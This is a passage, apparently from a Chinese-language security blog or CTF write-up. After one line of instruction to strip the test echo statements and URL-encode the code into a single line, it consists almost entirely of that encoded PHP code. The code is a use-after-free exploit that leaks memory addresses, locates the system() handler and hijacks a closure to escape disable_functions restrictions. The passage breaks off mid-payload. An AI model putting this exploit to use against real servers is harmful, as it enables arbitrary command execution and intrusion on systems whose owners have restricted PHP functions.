<p>我们需要对其中用于测试的<code>echo</code>代码注释或删除掉，再将代码部分进行URL编码（一定要编码成一行）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span>%<span class="number">20</span>%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>helper%<span class="number">3</span>B%<span class="number">0</span>Aclass%<span class="number">20</span>Test%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Apublic%<span class="number">20</span>HelperHelperHelperHelperHelperHelperHelper%<span class="number">20</span>%<span class="number">24</span>prop%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Aclass%<span class="number">20</span>HelperHelperHelperHelperHelperHelperHelper%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Apublic%<span class="number">20</span>%<span class="number">24</span>a%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>b%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afunction%<span class="number">20</span>s2n(%<span class="number">24</span>str)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>address%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">0</span>Afor%<span class="number">20</span>(%<span class="number">24</span>i%<span class="number">3</span>D0%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">3</span>C4%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B)%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>address%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">3</span>C%<span class="number">3</span>D%<span class="number">208</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>address%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">3</span>D%<span class="number">20</span>ord(%<span class="number">24</span>str%<span class="number">5</span>B4%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Areturn%<span class="number">20</span>%<span class="number">24</span>address%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afunction%<span class="number">20</span>s2b(%<span class="number">24</span>str%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>offset)%<span class="number">7</span>B%<span class="number">0</span>Areturn%<span class="number">20</span>hex2bin(str_pad(dechex(s2n(%<span class="number">24</span>str)%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>offset%<span class="number">20</span>-%<span class="number">200</span>x10)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">0</span>ASTR_PAD_LEFT))%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afunction%<span class="number">20</span>leak(%<span class="number">24</span>offset)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Aglobal%<span class="number">20</span>%<span class="number">24</span>abc%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>data%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>Afor%<span class="number">20</span>(%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">208</span>%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B)%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>data%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>abc%<span class="number">5</span>B%<span class="number">24</span>offset%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">207</span>%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Areturn%<span class="number">20</span>%<span class="number">24</span>data%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afunction%<span class="number">20</span>leak2(%<span class="number">24</span>address)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Aglobal%<span class="number">20</span>%<span class="number">24</span>helper%<span class="number">3</span>B%<span class="number">0</span>Awrite(<span class="number">0x20</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>address)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>leak%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>strlen(%<span class="number">24</span>helper-%<span class="number">3</span>Eb)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>leak%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>dechex(%<span class="number">24</span>leak)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>leak%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>str_pad(%<span class="number">24</span>leak%<span class="number">2</span>C%<span class="number">2016</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>leak%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>hex2bin(%<span class="number">24</span>leak)%<span class="number">3</span>B%<span class="number">0</span>Areturn%<span class="number">20</span>%<span class="number">24</span>leak%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afunction%<span class="number">20</span>write(%<span class="number">24</span>offset%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>data)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Aglobal%<span class="number">20</span>%<span class="number">24</span>abc%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>data%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>str_pad(%<span class="number">24</span>data%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cx00%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT)%<span class="number">3</span>B%<span class="number">0</span>Afor%<span class="number">20</span>(%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">208</span>%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B)%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>abc%<span class="number">5</span>B%<span class="number">24</span>offset%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">5</span>D%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>data%<span class="number">5</span>B7%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afunction%<span class="number">20</span>get_basic_funcs(%<span class="number">24</span>std_object_handlers)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>prefix%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>substr(%<span class="number">24</span>std_object_handlers%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">204</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>std_object_handlers%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>hexdec(bin2hex(%<span class="number">24</span>std_object_handlers))%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>start%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>std_object_handlers%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>x00000000fffff000%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">200</span>x0000000000000920%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">23</span>%<span class="number">20</span>change%<span class="number">200</span>x920%<span class="number">20</span><span class="keyword">if</span>%<span class="number">20</span>finding%<span class="number">20</span>failed%<span class="number">0</span>A%<span class="number">24</span>NumPrefix%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>std_object_handlers%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>x0000ffffff000000%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>NumPrefix%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>NumPrefix%<span class="number">20</span>-%<span class="number">200</span>x0000000001000000%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>funcs%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_defined_functions()%<span class="number">5</span><span class="string">B&#x27;internal&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>Afor(%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x1000%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>start%<span class="number">20</span>-%<span class="number">200</span>x1000%<span class="number">20</span>*%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>name_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>bin2hex(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>hex2bin(str_pad(dechex(%<span class="number">24</span>addr%<span class="number">20</span>-%<span class="number">200</span>x10)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">0</span>A%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT))))%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">20</span>(hexdec(%<span class="number">24</span>name_addr)%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>%<span class="number">24</span>std_object_handlers%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>hexdec(%<span class="number">24</span>name_addr)%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>NumPrefix)%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>Acontinue%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>name_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>str_pad(%<span class="number">24</span>name_addr%<span class="number">2</span>C%<span class="number">2016</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>name%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>strrev(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>s2b(hex2bin(%<span class="number">24</span>name_addr)%<span class="number">2</span>C%<span class="number">200</span>x00)))%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>name%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>explode(%<span class="number">22</span>%<span class="number">5</span>Cx00%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>name)%<span class="number">5</span>B0%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>Aif(in_array(%<span class="number">24</span>name%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>funcs))%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Areturn%<span class="number">20</span>%<span class="number">5</span>B%<span class="number">24</span>name%<span class="number">2</span>C%<span class="number">20</span>bin2hex(%<span class="number">24</span>prefix)%<span class="number">20</span>.%<span class="number">20</span>str_pad(dechex(%<span class="number">24</span>addr)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT)%<span class="number">2</span>C%<span class="number">0</span>A%<span class="number">24</span>std_object_handlers%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>NumPrefix%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afunction%<span class="number">20</span>getSystem(%<span class="number">24</span>unknown_func)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>unknown_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>hex2bin(%<span class="number">24</span>unknown_func%<span class="number">5</span>B1%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>prefix%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>substr(%<span class="number">24</span>unknown_addr%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">204</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>unknown_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>hexdec(%<span class="number">24</span>unknown_func%<span class="number">5</span>B1%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>start%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>unknown_addr%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>x00000000ffffffff%<span class="number">3</span>B%<span class="number">0</span>Afor(%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x800%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>start%<span class="number">20</span>-%<span class="number">200</span>x20%<span class="number">20</span>*%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>name_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>bin2hex(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>hex2bin(str_pad(dechex(%<span class="number">24</span>addr%<span class="number">20</span>-%<span class="number">200</span>x10)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">0</span>A%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT))))%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">20</span>(hexdec(%<span class="number">24</span>name_addr)%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>%<span class="number">24</span>unknown_func%<span class="number">5</span>B2%<span class="number">5</span>D%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>hexdec(%<span class="number">24</span>name_addr)%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">0</span>A%<span class="number">24</span>unknown_func%<span class="number">5</span>B3%<span class="number">5</span>D)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Acontinue%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>name_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>str_pad(%<span class="number">24</span>name_addr%<span class="number">2</span>C%<span class="number">2016</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>name%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>strrev(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>s2b(hex2bin(%<span class="number">24</span>name_addr)%<span class="number">2</span>C%<span class="number">200</span>x00)))%<span class="number">3</span>B%<span class="number">0</span>Aif(strstr(%<span class="number">24</span>name%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">22</span>system%<span class="number">22</span>))%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Areturn%<span class="number">20</span>bin2hex(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>hex2bin(str_pad(dechex(%<span class="number">24</span>addr%<span class="number">20</span>-%<span class="number">200</span>x10%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x08)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">0</span>A%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT))))%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Afor(%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x800%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>start%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x20%<span class="number">20</span>*%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>name_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>bin2hex(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>hex2bin(str_pad(dechex(%<span class="number">24</span>addr%<span class="number">20</span>-%<span class="number">200</span>x10)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">0</span>A%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT))))%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">20</span>(hexdec(%<span class="number">24</span>name_addr)%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>%<span class="number">24</span>unknown_func%<span class="number">5</span>B2%<span class="number">5</span>D%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>hexdec(%<span class="number">24</span>name_addr)%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">0</span>A%<span class="number">24</span>unknown_func%<span class="number">5</span>B3%<span class="number">5</span>D)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Acontinue%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>name_addr%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>str_pad(%<span class="number">24</span>name_addr%<span class="number">2</span>C%<span class="number">2016</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>name%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>strrev(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>s2b(hex2bin(%<span class="number">24</span>name_addr)%<span class="number">2</span>C%<span class="number">200</span>x00)))%<span class="number">3</span>B%<span class="number">0</span>Aif(strstr(%<span class="number">24</span>name%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">22</span>system%<span class="number">22</span>))%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Areturn%<span class="number">20</span>bin2hex(leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>hex2bin(str_pad(dechex(%<span class="number">24</span>addr%<span class="number">20</span>-%<span class="number">200</span>x10%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x08)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">0</span>A%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>STR_PAD_LEFT))))%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>rp%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>ReflectionProperty(Test%<span class="number">3</span>A%<span class="number">3</span>Aclass%<span class="number">2</span>C%<span class="number">20</span><span class="string">&#x27;prop&#x27;</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>test%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>Test%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>test%<span class="number">20</span>-%<span class="number">3</span>E%<span class="number">20</span>prop%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>HelperHelperHelperHelperHelperHelperHelper%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>abc%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>rp%<span class="number">20</span>-%<span class="number">3</span>E%<span class="number">20</span>getType()%<span class="number">20</span>-%<span class="number">3</span>E%<span class="number">20</span>getName()%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>helper%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>HelperHelperHelperHelperHelperHelperHelper()%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">20</span>(strlen(%<span class="number">24</span>abc)%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">201000</span>)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Aexit(%<span class="number">22</span>UAF%<span class="number">20</span>Failed!%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>helper%<span class="number">20</span>-%<span class="number">3</span>E%<span class="number">20</span>a%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>helper%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>php_heap%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>leak(<span class="number">0x10</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>helper%<span class="number">20</span>-%<span class="number">3</span>E%<span class="number">20</span>a%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>function(%<span class="number">24</span>x)%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>std_object_handlers%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>leak(<span class="number">0x0</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>prefix%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>substr(%<span class="number">24</span>php_heap%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">204</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">2</span>F%<span class="number">2</span>Fecho%<span class="number">20</span>%<span class="number">22</span>Helper%<span class="number">20</span><span class="keyword">Object</span>%<span class="number">20</span>Address%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>.%<span class="number">20</span>bin2hex(%<span class="number">24</span>php_heap)%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">2</span>F%<span class="number">2</span>Fecho%<span class="number">20</span>%<span class="number">22</span>std_object_handlers%<span class="number">20</span>Address%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>.%<span class="number">20</span>bin2hex(%<span class="number">24</span>std_object_handlers)%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>closure_object%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>leak(<span class="number">0x10</span>)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">2</span>F%<span class="number">2</span>Fecho%<span class="number">20</span>%<span class="number">22</span><span class="built_in">Closure</span>%<span class="number">20</span><span class="keyword">Object</span>%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>.%<span class="number">20</span>bin2hex(%<span class="number">24</span>closure_object)%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>Awrite(<span class="number">0x28</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cx06%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">0</span>Aif(!(%<span class="number">24</span>unknown_func%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_basic_funcs(%<span class="number">24</span>std_object_handlers)))%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Adie(%<span class="number">22</span>Couldn<span class="string">&#x27;t%20determine%20funcs%20address%22)%3B%0A%7D%0A%2F%2Fecho%20%22Find%20func&#x27;</span>s%<span class="number">20</span>adress%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">24</span>unknown_func%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>-%<span class="number">3</span>E%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">24</span>unknown_func%<span class="number">5</span>B0%<span class="number">5</span>D%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>Aif(!(%<span class="number">24</span>system_address%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>getSystem(%<span class="number">24</span>unknown_func)))%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Adie(%<span class="number">22</span>Couldn<span class="string">&#x27;t%20determine%20system%20address%22)%3B%0A%7D%0A%2F%2Fecho%20%22Find%20system&#x27;</span>s%<span class="number">20</span>handler%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">24</span>system_address%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>Afor%<span class="number">20</span>(%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>(<span class="number">0x130</span>%<span class="number">20</span>%<span class="number">2</span>F%<span class="number">200</span>x08)%<span class="number">3</span>B%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B)%<span class="number">20</span>%<span class="number">7</span>B%<span class="number">0</span>Awrite(<span class="number">0x308</span>%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x08%<span class="number">20</span>*%<span class="number">20</span>(%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">201</span>)%<span class="number">2</span>C%<span class="number">20</span>leak2(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>s2b(%<span class="number">24</span>closure_object%<span class="number">2</span>C%<span class="number">200</span>x08%<span class="number">20</span>*%<span class="number">0</span>A%<span class="number">24</span>i)))%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>abc%<span class="number">5</span>B0x308%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x40%<span class="number">5</span>D%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cx01%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>Awrite(<span class="number">0x308</span>%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x70%<span class="number">2</span>C%<span 